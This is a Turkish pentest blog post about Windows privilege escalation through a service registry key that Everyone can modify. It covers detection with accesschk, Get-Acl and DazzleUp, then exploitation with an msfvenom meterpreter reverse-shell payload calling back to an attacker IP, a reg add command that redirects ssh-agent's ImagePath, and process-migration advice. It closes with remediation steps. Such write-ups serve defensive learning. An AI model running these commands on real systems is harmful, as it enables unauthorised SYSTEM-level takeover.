---
layout: post
title: Modifiable Service Registry Key
description: "Kayıt Defterindeki Düzenlenebilir Anahtarlar."
modified: 2020-09-15
comments: true
categories: TR
tags: [yetki yükseltme, privilege escalation, windows, pentest]
---

##	Özet

Windows sistemlerde sistemde bir servis kaydedildiğinde, kayıt defterine servisin çalıştırılabilir dosyasını içeren bir anahtar girilir. Varsayılan ayarlarda sadece yöneticilerin değiştirebileceği bu anahtar bazen yanlış yapılandırılarak başka kullanıcılar tarafında değiştirilebilir hale gelebilir. Bu şekilde bir yanlış yapılandırma sonucu yeni ayrıcalık elde etme çok karşılaşılan bir senaryo değildir. 


##	Detay

Örneğin NT AUTHORITY\SYSTEM ayrıcalıklarında çalıştırılan bir servisin çalıştırılabilir dosya (exe) yolu başka kullanıcılar tarafından değiştirilebilir olsun. Bu anahtar sisteme yüklenmiş zararlı yazılımın tam yolu ile değiştirilebilir. Zararlı yazılımın tam yolu anahtara girildiğinden dolayı, Windows değiştirilen adresteki çalıştırılabilir dosyayı yani zararlı yazılımı çalıştıracaktır. Servis NT AUTHORITY\SYSTEM ayrıcalıklarında çalıştırıldığı için zararlı yazılımda bu ayrıcalıklar ile çalıştırılacaktır. Elde edilen oturumda bu ayrıcalıklara sahip olacaktır.

Özetle servisin kayıt defterindeki adresi değiştirilmiş dosyayı çalıştırmasından dolayı sistemde yeni ayrıcalıklar elde edilmiş oldu. Servisin kayıt defterinde ki izinlerinin hatalı yapılandırılması bu duruma sebebiyet vermiştir.


## Bulunması

Sisteme bir hizmet eklendiği zaman kayıt defterinde bu izinler
~~~
HKLM\SYSTEM\CurrentControlSet\Services 
~~~
bölümüne eklenir. İzinlerin yanlış yapılandırılıp yapılandırılmadığını kontrol etmek için bu bölüm altındaki kayıtlar incelenmelidir. İnceleme sysinternals araçlarından olan **accesschk.exe** kullanılarak yapılabilir.

İnceleme için;
```powershell
Accesschk.exe “Everyone” -kvuqsw HKLM\SYSTEM\CurrentControlSet\Services
```
komutunu kullanarak yapabilirsiniz.

<p align="center">
	<img src="/images/mod_serv_reg_ss/1.png" alt="">
</p>


<pre><code class="powershell">Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ssh-agent | Format-List</code></pre>

Yanlış yapılandırılmış servisi daha detaylı incelemek için;
```powershell
Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\ssh-agent | Format-List
```
komutu girilebilir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/2.png" alt="">
</p>

Çıktılar incelendiğinde ssh-agent servisinin NT AUTHORITY\SYSTEM ayrıcalıklarında çalıştığı ve kayıt defterinde herkes tarafından düzenlenebilir olduğu görülebilir.

Tüm işlemleri otomatik olarak yapmak için DazzleUp kullanılabilir. DazzleUp çıktısının ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/3.png" alt="">
</p>

Yanlış yapılandırılmış kayıt izinleri aşağıda gösterilmiştir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/4.png" alt="">
</p>

##	İstismar Edilmesi

Kayıt defterindeki anahtar değeri değiştirilerek bulaştırılacak olan zararlı yazılımı;
```bash
msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.6.182 LPORT=445 -f exe -o zararli.exe
```
komutu ile hazırlanabilir. Komutun hazırlandığına dair ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/5.png" alt="">
</p>

Zararlı yazılım hedef makineye daha önceden elde edilmiş bir oturum üzerinden yüklendiğine dair ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/6.png" alt="">
</p>

Kayıt defterinde **open-ssh** kaydının **ImagePath** anahtarı kontrol edildiğinde kendi çalıştırılabilir dosyasının yolunun kayıtlı olduğu aşağıda gösterilmiştir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/7.png" alt="">
</p>

Kayıt;
```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Services\ssh-agent /v ImagePath /t REG_EXPAND_SZ /d C:\Users\test\Desktop\zararli.exe
```
komutu yazılarak değiştirilebilir. Komutun, test kullanıcısının ayrıcalıklarında yazıldıktan sonraki ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/8.png" alt="">
</p>

Komut sonucu **ImagePath** anahtarında ki değişiklik aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/9.png" alt="">
</p>

Aynı denetlemeyi daha önce elde ettiğimiz oturumdan da kontrol ederek doğrulayabiliriz. Doğrulama için;
```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\ssh-agent /v ImagePath
```
komutu kullanılabilir. Komutun ekran çıktısı aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/10.png" alt="">
</p>

Zararlı yazılımın çalışması için servisin tekrar başlatılması gerekmektedir. Servis tekrar başlatıldığında elde edilecek oturum NT AUTHORITY\SYSTEM ayrıcalıklarında olacaktır. Elde edilen oturumun ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/12.png" alt="">
</p>

**NOT:** Windows işletim sistemi servisin düzgün başlatılıp başlatılmadığını kontrol eder. Eğer servis 3 dakika içerisinde düzgün başlatılmaz ise aşağıda ki ekran görüntüsünde verilen bilgilendirmeyi yapar ve öncesinde başlattığı bütün süreçleri öldürür. Hazırlanan zararlı yazılım servis olmadığı için düzgün başlatılamayacak ve elde edilen oturum kısa süre içerisinde ölecektir. Kısa süre içerisinde başka bir sürece migrate olunması gerekmektedir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/13.png" alt="">
</p>

##	Çözüm

Kayıt defterinde ki izinlerin yanlış yapılandırılmasından kaynaklı olan bu yöntemi engellemek için izinlerin doğru şekilde tekrar yapılandırılması gerekmektedir. İzinleri değiştirme yetkisini sadece yöneticilere verilecek şekilde düzenlemek problemi çözecektir.
Aşağıda ki ekran görüntüsünde **Everyone** kaldırılarak sadece yöneticilerin değiştirme izninin kaldığı gösterilmiştir.

Accesschk ile yanlış yapılandırılmış kayıt tekrar kontrol edildiğinde **Everyone** artık değiştirme ayrıcalığına sahip olmadığı görülür.

<p align="center">
	<img src="/images/mod_serv_reg_ss/14.png" alt="">
</p>

Yapılandırma hatasını otomatik olarak bulan DazzleUp ile tekrar kontrol edildiğinde, yapılandırma hatasının giderildiği aşağıda ki resimde gösterilmiştir.

<p align="center">
	<img src="/images/mod_serv_reg_ss/15.png" alt="">
</p>

##	Kaynakça

*	https://en.wikipedia.org/wiki/Windows_Registry
*	https://github.com/hlldz/dazzleUP
*	https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
